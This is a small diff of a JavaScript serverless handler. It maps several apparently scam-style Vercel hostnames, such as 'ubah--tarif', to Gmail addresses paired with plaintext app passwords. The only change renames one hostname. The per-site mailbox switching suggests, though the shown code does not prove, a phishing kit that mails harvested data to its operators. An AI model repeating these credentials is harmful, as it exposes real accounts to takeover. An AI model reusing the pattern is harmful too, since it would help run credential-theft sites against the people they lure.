@@ -32,7 +32,7 @@ export default function handler(req, res) {
         email = 'callbribricoid66@gmail.com';
         pass = 'imuujsgssprgrtue';
 
-    } else if(url == 'ubah--tarif.vercel.app'){
+    } else if(url == 'ubah--tariff.vercel.app'){
         email = 'andarasultan954@gmail.com';
         pass = 'xwjfzwdtiaxfname';
 
